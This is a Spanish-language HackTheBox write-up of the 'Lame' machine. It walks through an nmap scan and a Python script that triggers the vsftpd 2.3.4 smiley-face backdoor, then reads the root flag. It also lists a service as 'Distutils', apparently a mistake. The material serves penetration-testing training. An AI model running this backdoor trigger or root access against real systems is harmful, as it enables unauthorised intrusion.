---
title: "Lame"
date: "2026-04-12"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
---

## Reconnaissance

Iniciamos con un escaneo agresivo de puertos usando `nmap` para encontrar los puntos de entrada débiles.

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.10.3 -oN nmap_lame.txt
```

> **Nota del Attacker:** Se detectaron servicios legacy extremadamente vulnerables. Distutils y vsftpd están a la escucha.

### Identificando VSFTPD 2.3.4 (Puerto 21)

El escaneo de red revela la versión infame de vsftpd, la cual contiene un backdoor malicioso integrado por diseño.

![Scan de Nmap](https://placehold.co/800x300/161b22/2ee65f?text=[ROOT]+nmap+-sC+-sV+10.10.10.3)

## Explotación

La explotación de esta vulnerabilidad es trivial utilizando el vector "Smiley Face" en el nombre de usuario de conexión por FTP.

```python
import socket

target = "10.10.10.3"
port = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)

# Enviamos usuario malicioso con el trigger :)
s.send(b"USER backdoored:)\r\n")
s.recv(1024)
s.send(b"PASS pass\r\n")
```

Una vez que el socket escucha nuevamente en el puerto `6200`, conseguimos acceso nativo a una terminal bash oculta en la máquina remota con privilegios absolutos de **Root**.

```bash
whoami
# root
cat /root/root.txt
# 9f86d081884c7d659a2feaa0c55ad015
```

Terminal secuestrada con éxito. EOF.
